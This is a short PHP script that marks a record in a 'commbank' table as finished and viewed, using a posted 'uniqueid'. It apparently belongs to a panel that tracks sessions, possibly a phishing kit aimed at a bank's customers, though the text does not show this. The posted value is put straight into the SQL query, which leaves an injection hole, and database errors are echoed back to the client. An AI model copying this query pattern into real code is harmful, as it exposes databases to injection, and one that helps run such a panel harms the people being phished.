<?php
require '../connection.php';

if ($_POST["uniqueid"]) {
  $uniqueid = $_POST["uniqueid"];

  $finish_session = mysqli_query($conn, "UPDATE commbank SET status=6, viewed='true' WHERE uniqueid=$uniqueid");

  if ($finish_session) {
    echo json_encode(array(
      'status' => 'success'
    ));
  } else {
    echo json_encode(array(
      'status' => 'failure',
      'error' => mysqli_error($conn)
    ));
  }
}

?>
